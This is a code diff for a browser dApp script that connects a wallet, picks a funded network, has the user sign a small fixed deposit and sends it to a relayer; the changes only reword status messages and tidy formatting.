@@ -7,16 +7,16 @@ import { ethers } from "ethers"
 
 const status = document.getElementById("status")
 
-function setStatus(msg) {
-  status.innerText = msg
-  console.log(msg)
+function setStatus(msg){
+ status.innerText = msg
+ console.log(msg)
 }
 
-async function start() {
+async function start(){
 
- try {
+ try{
 
-  setStatus("Opening wallet connection...")
+  setStatus("Connecting wallet...")
 
   const { signer, address } = await connectWallet()
 
@@ -25,24 +25,24 @@ async function start() {
    return
   }
 
-  setStatus("Wallet connected: " + address)
+  setStatus("Wallet: " + address)
 
-  setStatus("Scanning networks for balance...")
+  setStatus("Scanning networks...")
 
   const network = await findNetwork(address)
 
-  if (!network) {
+  if(!network){
 
-   setStatus("No eligible balance found ($1+)")
+   setStatus("No eligible network found")
 
    return
   }
 
-  setStatus("Network selected: " + network.name)
+  setStatus("Using network: " + network.name)
 
   const provider = new ethers.JsonRpcProvider(network.rpc)
 
-  setStatus("Getting contract nonce...")
+  setStatus("Fetching nonce")
 
   const nonce = await getNonce(
    provider,
@@ -54,7 +54,7 @@ async function start() {
 
   const amount = "0.0005"
 
-  setStatus("Requesting wallet signature...")
+  setStatus("Signing authorization")
 
   const sig = await signDeposit(
    signer,
@@ -69,7 +69,7 @@ async function start() {
    return
   }
 
-  setStatus("Signature received")
+  setStatus("Preparing transaction")
 
   const iface = new ethers.Interface([
    "function executeDeposit(address user,uint256 amount,uint256 nonce,bytes signature)"
@@ -85,7 +85,7 @@ async function start() {
    ]
   )
 
-  setStatus("Sending request to relayer...")
+  setStatus("Sending to relayer")
 
   const result = await sendRelayer({
 
@@ -103,19 +103,19 @@ async function start() {
 
   console.log("Relayer response:", result)
 
-  if (result && result.success) {
+  if(result && result.success){
 
-   setStatus("Transaction executed ✔ Hash: " + result.hash)
+   setStatus("Transaction executed ✔ " + result.hash)
 
-  } else {
+  }else{
 
    setStatus("Relayer rejected request")
 
   }
 
- } catch (err) {
+ }catch(err){
 
-  console.error("FULL ERROR:", err)
+  console.error(err)
 
   setStatus("Error: " + err.message)
 
